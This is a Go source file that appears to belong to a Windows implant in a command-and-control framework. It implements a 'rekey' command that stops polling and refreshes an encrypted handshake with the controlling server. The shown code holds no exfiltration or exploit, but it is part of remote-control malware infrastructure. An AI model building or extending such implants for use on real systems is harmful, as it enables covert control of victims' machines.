// server/docker/payloads/Windows/action_rekey.go
//go:build windows
// +build windows

package main

import (
	// "log"
	"time"
)

type RotateMsg struct{}

func (c *RotateMsg) execute(ctx *OpCtx, args []string) OpResult {

	// Note: The actual rekey logic is now handled in polling.go
		// This function is kept for compatibility but shouldn't be
	// called directly anymore since rekey needs special handling
	// before decryption can occur.

	// If this is somehow called directly (shouldn't happen with new logic),
	// we still perform the rekey

	// Stop existing polling first
	stopPolling()

	// Perform handshake refresh
	err := refreshHandshake()
	if err != nil {
		return OpResult{
			Error:       err,
			EStr: Err(E31),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	return OpResult{
		Output:      Succ(S5),
		EC:    0,
		Done: time.Now().Format(time.RFC3339),
	}
}
